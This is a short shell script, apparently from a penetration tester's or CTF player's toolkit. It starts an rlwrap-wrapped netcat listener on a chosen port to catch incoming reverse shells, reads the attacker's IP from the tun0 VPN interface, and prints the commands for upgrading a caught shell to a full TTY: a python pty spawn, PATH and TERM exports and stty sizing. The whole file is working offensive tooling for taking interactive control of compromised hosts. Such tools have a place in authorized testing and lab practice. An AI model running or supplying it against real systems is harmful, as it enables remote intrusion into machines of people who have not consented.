#!/bin/sh

# script will start a listener for reverse shell
# needs rlwrap and netcat installed
# change interface as needed
# usage ./listen.sh 6667


port=$1
lhost=$(ip a s tun0|grep "inet "|tr -s " "|cut -d " " -f 3|cut -d "/" -f 1)
rows=$(tput lines) 
columns=$(tput cols)

echo "[+] Listening on:"
echo LHOST $lhost 
echo LPORT $port
echo "[!] paste below into Terminal"
echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" 
echo "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
echo "export SHELL=bash"
echo "export TERM=$TERM"
echo "stty rows $rows columns $columns"
echo "[!] Waiting for shell..."
rlwrap -r -f . nc -ll -v  -p $port
